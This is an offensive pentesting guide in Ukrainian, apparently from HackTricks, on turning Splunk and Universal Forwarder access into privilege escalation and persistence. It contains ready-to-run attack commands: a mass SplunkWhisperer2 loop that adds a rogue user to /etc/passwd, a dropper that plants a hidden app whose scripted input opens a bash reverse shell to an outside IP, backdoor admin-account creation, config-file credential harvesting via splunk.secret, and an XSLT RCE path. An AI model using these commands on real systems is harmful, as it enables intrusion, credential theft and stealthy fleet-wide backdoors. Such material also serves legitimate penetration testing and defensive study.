# Splunk LPE and Persistence

{{#include ../../banners/hacktricks-training.md}}

Якщо під час **enumerating** машини **внутрішньо** або **зовнішньо** ви виявили **Splunk running** (зазвичай **8000** для веб-інтерфейсу та **8089** для management API), дійсні облікові дані часто можна перетворити на **code execution** через встановлення app, scripted inputs або management actions. Якщо Splunk працює як **root**, це часто одразу призводить до **privilege escalation**.

Якщо вам потрібна лише загальна поверхня remote attack, enumeration або шлях app-upload RCE, перегляньте:

{{#ref}}
../../network-services-pentesting/8089-splunkd.md
{{#endref}}

Якщо ви **already root**, а Splunk service слухає не лише localhost, ви також можете викрасти **Splunk password hashes**, відновити **encrypted secrets** або розгорнути **malicious app**, щоб зберегти persistence локально чи на кількох forwarders.

## Цікаві локальні файли

Коли ви отримуєте доступ до host, на якому працює Splunk або Splunk Universal Forwarder, зазвичай найцікавішими є такі шляхи:
```bash
export SPLUNK_HOME=/opt/splunk
[ -d /opt/splunkforwarder ] && export SPLUNK_HOME=/opt/splunkforwarder

find "$SPLUNK_HOME/etc" -maxdepth 4 \( -name passwd -o -name authentication.conf -o -name user-seed.conf -o -name inputs.conf -o -name app.conf -o -name serverclass.conf -o -name outputs.conf -o -name splunk.secret \) 2>/dev/null

grep -RniE 'pass4SymmKey|sslPassword|bindDNPassword|clear_password|token' "$SPLUNK_HOME/etc" 2>/dev/null
```
Важливі артефакти:

- **`$SPLUNK_HOME/etc/passwd`**: локальні користувачі Splunk і хеші паролів.
- **`$SPLUNK_HOME/etc/auth/splunk.secret`**: ключ, який Splunk використовує для шифрування секретів, що зберігаються в кількох файлах `.conf`.
- **`$SPLUNK_HOME/etc/system/local/user-seed.conf`**: початковий файл bootstrap для адміністратора; корисний у gold images і випадках помилок під час provisioning. Ігнорується, якщо `etc/passwd` уже існує.
- **`$SPLUNK_HOME/etc/apps/*/{default,local}/inputs.conf`**: місце, де зазвичай активуються scripted inputs.
- **`$SPLUNK_HOME/etc/deployment-apps/`** або **`$SPLUNK_HOME/etc/apps/`**: хороші місця, щоб приховати persistent app або перевірити, що вже розповсюджується.

## Splunk Universal Forwarder Agent Exploit Summary

Докладнішу інформацію дивіться за посиланням [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/). Це лише короткий огляд:

**Огляд exploit:**
Exploit, націлений на Splunk Universal Forwarder (UF), дає атакувальникам із **agent password** змогу виконувати довільний code у системах, де запущено agent, потенційно компрометуючи значну частину середовища.

**Чому це працює:**

- Сервіс керування UF зазвичай доступний через **TCP 8089**.
- Атакувальники можуть автентифікуватися в API та вказати forwarder встановити **malicious app bundle**.
- Цей самий primitive можна використовувати локально для **LPE** або віддалено для **RCE**.
- Public tooling, наприклад **SplunkWhisperer2**, автоматично створює app bundle і може адаптувати payloads для Linux targets.

**Поширені способи відновлення пароля:**

- Облікові дані у cleartext у документації, скриптах, shares або deployment automation.
- Хеші паролів у `$SPLUNK_HOME/etc/passwd` із подальшим offline cracking.
- Golden images або залишки provisioning, наприклад `user-seed.conf`.

**Вплив:**

- Виконання code на рівні SYSTEM/root на кожному compromised host.
- Розгортання persistent apps, backdoors або ransomware.
- Вимкнення чи підміна telemetry перед пересиланням даних.

**Приклад команди для exploitation:**
```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```
**Доступні публічні експлойти:**

- [https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2)
- [https://www.exploit-db.com/exploits/46238](https://www.exploit-db.com/exploits/46238)
- [https://www.exploit-db.com/exploits/46487](https://www.exploit-db.com/exploits/46487)

## Persistence через Scripted Inputs або Malicious Apps

Якщо у вас є **доступ на запис до файлової системи** від імені `root`/`splunk` або автентифікований доступ для встановлення apps, дуже надійним механізмом Persistence є розміщення **custom app** із **scripted input**. Власна документація Splunk передбачає, що scripted inputs мають розташовуватися в каталозі app і вмикатися через `inputs.conf`.

Типова структура:
```bash
/opt/splunk/etc/apps/.linux_audit/
├── bin/check.sh
└── default/inputs.conf
```
Мінімальний `inputs.conf`:
```ini
[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]
disabled = 0
interval = 60
sourcetype = auditd
```
Швидкий Linux dropper:
```bash
APP="$SPLUNK_HOME/etc/apps/.linux_audit"
mkdir -p "$APP/bin" "$APP/default"
printf '#!/bin/bash\nbash -c "bash -i >& /dev/tcp/10.10.14.7/4444 0>&1"\n' > "$APP/bin/check.sh"
printf '[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]\ndisabled = 0\ninterval = 60\n' > "$APP/default/inputs.conf"
chmod +x "$APP/bin/check.sh"
"$SPLUNK_HOME/bin/splunk" restart
```
Нотатки:

- Цей самий trick працює на **Universal Forwarder** із використанням `/opt/splunkforwarder/etc/apps/`.
- Attackers часто маскуються, змінюючи легітимний add-on замість створення очевидно malicious app.
- На **deployment server** розміщення malicious app усередині `deployment-apps/` перетворюється на **fleet-wide persistence**, оскільки forwarders опитують сервер, завантажують оновлені apps і часто перезапускаються для їх застосування.

## Крадіжка облікових даних і захоплення admin-доступу

Якщо ви можете читати локальні файли Splunk, зазвичай є дві основні цілі: відновити **Splunk admin access** і отримати **encrypted service credentials**.

### Хеші паролів і локальні користувачі

Splunk зберігає локальні дані автентифікації у `etc/passwd`. Залежно від deployment, cracking цього файлу може відновити робочі credentials для web UI та management API.

Якщо у вас уже є дійсні **admin** credentials і Splunk використовує **native** authentication backend, сам CLI можна використати для persistence:
```bash
"$SPLUNK_HOME/bin/splunk" edit user admin -password 'Winter2026!' -auth admin:'OldPassword!'
"$SPLUNK_HOME/bin/splunk" add user svc_backup -password 'Winter2026!' -role admin -auth admin:'OldPassword!'
```
### `splunk.secret` та зашифровані значення

Splunk використовує `etc/auth/splunk.secret` для захисту конфіденційних значень, що зберігаються в кількох конфігураційних файлах. Якщо вам вдасться викрасти і **secret**, і відповідні **`.conf` файли**, ви часто зможете відновити або повторно використати:

- спільні secret forwarder/indexer, такі як `pass4SymmKey`
- паролі приватних TLS-ключів, такі як `sslPassword`
- облікові дані LDAP bind, такі як `bindDNPassword`

Це корисно для **lateral movement**, навіть якщо пароль адміністратора Splunk неможливо зламати.

### Зловживання `user-seed.conf`

`user-seed.conf` обробляється лише під час першого запуску або коли `etc/passwd` не існує. Це робить його менш корисним на активній системі, але дуже цікавим у:

- скомпрометованих шаблонах інсталяції
- container images
- unattended provisioning workflows
- appliance, де Splunk автоматично ініціалізується повторно

У таких випадках розміщення `HASHED_PASSWORD`, згенерованого за допомогою `splunk hash-passwd`, дає змогу непомітно відновити адміністративний доступ після повторного розгортання.

## Зловживання Splunk Queries

Докладнішу інформацію дивіться на [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis).

Корисна нещодавня техніка полягає у зловживанні **user-supplied XSLT** у вразливих версіях Splunk Enterprise, щоб перетворити автентифікований обліковий запис із низькими привілеями на можливість **OS command execution** від імені користувача `splunk`.

Загальний порядок дій:

1. Автентифікуватися у Splunk.
2. Завантажити шкідливий **XSL**-файл через функціональність preview/upload.
3. Змусити Splunk відобразити результати пошуку за допомогою завантаженої stylesheet із каталогу **dispatch**.
4. Використати XSLT payload для запису файлу або запуску execution через search pipeline Splunk (наприклад, звернувшись до внутрішньої функціональності, такої як `runshellscript`).

Важливий offensive takeaway полягає в тому, що цей шлях забезпечує **post-auth RCE без потреби в app upload**. У Linux це зазвичай надає доступ до облікового запису **`splunk`**, що все одно є цінним, оскільки цей користувач часто володіє application tree, може читати secrets і встановлювати persistent apps, які переживають втрату shell.

Типовий шлях, що використовується під час exploitation:
```text
/opt/splunk/var/run/splunk/dispatch/<sid>/shell.xsl
```
Якщо Splunk запущено з надмірними привілеями або користувач `splunk` має доступ до небезпечних скриптів, доступних для запису service units чи небезпечних правил `sudo`, це утворює чистий ланцюжок **LPE**.

## Посилання

- [https://advisory.splunk.com/advisories/SVD-2023-1104](https://advisory.splunk.com/advisories/SVD-2023-1104)
- [https://www.huntress.com/blog/beware-of-traitorware-using-splunk-for-persistence](https://www.huntress.com/blog/beware-of-traitorware-using-splunk-for-persistence)
{{#include ../../banners/hacktricks-training.md}}
